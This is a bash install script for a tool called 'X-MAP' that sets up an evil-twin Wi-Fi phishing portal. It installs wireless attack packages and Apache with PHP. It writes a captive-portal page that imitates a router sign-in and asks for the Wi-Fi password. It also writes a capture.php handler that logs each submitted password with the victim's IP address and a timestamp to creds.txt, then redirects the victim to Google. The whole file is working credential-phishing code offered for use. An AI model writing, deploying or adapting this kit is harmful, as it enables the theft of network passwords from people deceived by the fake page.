#!/bin/bash

# X-MAP Auto-Installer
# Run as: sudo ./install.sh

GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}[*] Starting X-MAP Setup & Installation...${NC}"

# 1. Update and Install Dependencies
echo -e "${GREEN}[+] Installing required packages (aircrack-ng, hostapd, dnsmasq, apache2, php)...${NC}"
sudo apt update
sudo apt install aircrack-ng hostapd dnsmasq apache2 php iptables wireless-tools -y

# 2. Setup Captive Portal Directory
echo -e "${GREEN}[+] Configuring Web Server (Apache)...${NC}"
sudo mkdir -p /var/www/html/templates

# 3. Create index.php
echo -e "${GREEN}[+] Creating index.php...${NC}"
sudo tee /var/www/html/index.php > /dev/null << 'EOF'
<?php
$router_name_file = '/var/www/html/current_router.txt';
$ROUTER_NAME = file_exists($router_name_file) ? trim(file_get_contents($router_name_file)) : 'WiFi';

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$template = '/var/www/html/templates/android.html';

if (preg_match('/iphone|ipad|ipod/i', $user_agent)) {
    $template = '/var/www/html/templates/ios.html';
} elseif (preg_match('/windows/i', $user_agent)) {
    $template = '/var/www/html/templates/windows.html';
}

if (file_exists($template)) {
    $html = file_get_contents($template);
    $html = str_replace('{{ROUTER_NAME}}', htmlspecialchars($ROUTER_NAME, ENT_QUOTES), $html);
    echo $html;
} else {
    echo "Template missing!";
}
?>
EOF

# 4. Create capture.php
echo -e "${GREEN}[+] Creating capture.php...${NC}"
sudo tee /var/www/html/capture.php > /dev/null << 'EOF'
<?php
$file = '/var/www/html/creds.txt';
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$entry = "[$time] IP: $ip | User: $user | Pass: $pass\n";
file_put_contents($file, $entry, FILE_APPEND);
header('Location: https://www.google.com');
exit;
?>
EOF

# 5. Create a basic dummy HTML template
echo -e "${GREEN}[+] Creating default HTML templates...${NC}"
sudo tee /var/www/html/templates/android.html > /dev/null << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to {{ROUTER_NAME}}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>body{font-family:sans-serif;background:#f4f4f4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;} .box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:300px;text-align:center;} input{width:100%;padding:10px;margin:10px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;} button{width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;font-size:16px;}</style>
</head>
<body>
    <div class="box">
        <h2>{{ROUTER_NAME}}</h2>
        <p>Enter Wi-Fi password to continue.</p>
        <form action="/capture.php" method="POST">
            <input type="password" name="password" placeholder="Wi-Fi Password" required>
            <input type="hidden" name="username" value="{{ROUTER_NAME}}">
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF

sudo cp /var/www/html/templates/android.html /var/www/html/templates/ios.html
sudo cp /var/www/html/templates/android.html /var/www/html/templates/windows.html

# 6. Set Permissions
echo -e "${GREEN}[+] Setting up file permissions...${NC}"
sudo touch /var/www/html/creds.txt
sudo touch /var/www/html/current_router.txt
sudo chown -R www-data:www-data /var/www/html/
sudo chmod 666 /var/www/html/creds.txt
sudo chmod 644 /var/www/html/current_router.txt
sudo systemctl restart apache2

echo -e "${CYAN}[*] Installation Complete!${NC}"
